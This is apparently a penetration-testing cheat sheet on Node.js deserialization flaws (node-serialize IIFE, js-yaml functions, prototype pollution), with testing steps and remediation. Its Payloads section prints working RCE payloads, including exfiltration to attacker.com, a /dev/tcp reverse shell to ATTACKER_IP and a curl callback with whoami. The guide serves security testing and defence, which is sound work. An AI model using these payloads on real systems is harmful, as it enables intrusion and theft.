# Node.js Deserialization (node-serialize / serialize-javascript RCE)

## Overview
Node.js applications using insecure serialization libraries — particularly `node-serialize` — are vulnerable to Remote Code Execution via Immediately Invoked Function Expressions (IIFE) embedded in serialized data. The `node-serialize` library executes JavaScript function definitions in serialized objects when deserialized, allowing attackers to embed and execute arbitrary code.

## How It Works
- `node-serialize` serializes JavaScript objects including functions as `_$$ND_FUNC$$_function(){...}`.
- When deserializing, if the function definition is followed by `()`, it executes as an IIFE.
- Attackers craft a payload: `{"cmd":"_$$ND_FUNC$$_function (){require('child_process').exec('id')}()"}`.
- Other attack surfaces: `js-yaml.load()` (YAML deserialization), `JSON.parse()` of untrusted eval-like objects, `eval()` of user-supplied code.
- `serialize-javascript` is a different library but can lead to XSS if output is embedded in HTML without sanitization.

## Impact
- Remote Code Execution via IIFE in `node-serialize`.
- Server-side XSS/template injection via `serialize-javascript`.
- Prototype pollution leading to DoS or RCE.
- Access to the server's file system, environment variables, and internal services.

## Where to Look
- Express session stores using cookie-based sessions with `node-serialize`.
- Cookies that look like base64-encoded JavaScript object dumps.
- API endpoints that accept serialized JavaScript.
- `js-yaml.load()` with untrusted YAML input (vulnerable before yaml v4 changed to safeLoad default).
- Prototype pollution entry points: `_.merge()`, `JSON.parse()` with `__proto__` keys.

## Testing Steps
1. Decode cookies and look for `_$$ND_FUNC$$_` pattern.
2. Check for `js-yaml.load()` with user-controlled YAML input.
3. Generate an IIFE payload for `node-serialize`.
4. Test prototype pollution: send `{"__proto__": {"polluted": true}}` and check if the property appears on `{}.polluted`.
5. Use OOB DNS callback for blind confirmation.

## Payloads / Techniques
```bash
# Detect node-serialize format in cookie
echo "YOUR_COOKIE" | base64 -d | grep "_\$\$ND_FUNC\$\$_"
```

```javascript
// Generate node-serialize RCE payload
// Install: npm install node-serialize
const serialize = require('node-serialize');

// Malicious payload with IIFE
const payload = {
    "rce": "_$$ND_FUNC$$_function (){require('child_process').exec('id', (err, stdout) => { require('http').get('http://attacker.com/?data=' + encodeURIComponent(stdout)); });}()"
};

// Base64 encode for cookie
const b64 = Buffer.from(JSON.stringify(payload)).toString('base64');
console.log("Cookie payload:", b64);

// Reverse shell via node-serialize
const revshell = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')}()"
};
```

```python
# Generate payload manually
import base64, json

# node-serialize IIFE payload
payload = {
    "rce": "_$$ND_FUNC$$_function(){require('child_process').exec('curl http://COLLABORATOR.burpcollaborator.net/$(whoami)')}()"
}
b64 = base64.b64encode(json.dumps(payload).encode()).decode()
print(f"Payload: {b64}")
```

```yaml
# js-yaml.load() RCE payload (Node.js)
# If yaml.load() is used (not yaml.safeLoad()):
"toString": !<tag:yaml.org,2002:js/function> "function (){return require('child_process').execSync('id').toString()}"
```

```bash
# Prototype pollution test
curl -s -X POST https://target.com/api/merge \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "yes"}}'
# Then check if Object.prototype.polluted === "yes" in server-side code
```

## Burp Suite Tips
- Decode base64 cookies in **Burp Decoder** and search for `_$$ND_FUNC$$_`.
- In **Repeater**, replace the cookie value with your base64-encoded payload.
- Use **Burp Collaborator** for OOB DNS confirmation.
- **Active Scanner** (Pro) may detect deserialization issues via header injection.

## Tools
- node-serialize library (for generating payloads in controlled env)
- ysoserial.js — https://github.com/nicehash/ysoserial (Node.js serialization payloads)
- prototype-pollution scanner — https://github.com/BlackFan/client-side-prototype-pollution

## Remediation
- Replace `node-serialize` with `JSON.stringify()` / `JSON.parse()` — JSON does not serialize functions.
- Replace `js-yaml.load()` with `js-yaml.safeLoad()` (deprecated) or `yaml.load(data, {schema: yaml.FAILSAFE_SCHEMA})` in modern versions.
- Never serialize/deserialize user-controlled functions.
- For prototype pollution: use `Object.create(null)` for key-value stores, validate input doesn't contain `__proto__`, `constructor`, or `prototype` keys.
- Implement integrity checks (HMAC) on all serialized data before deserialization.

## References
https://portswigger.net/web-security/deserialization
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
https://github.com/nicehash/ysoserial
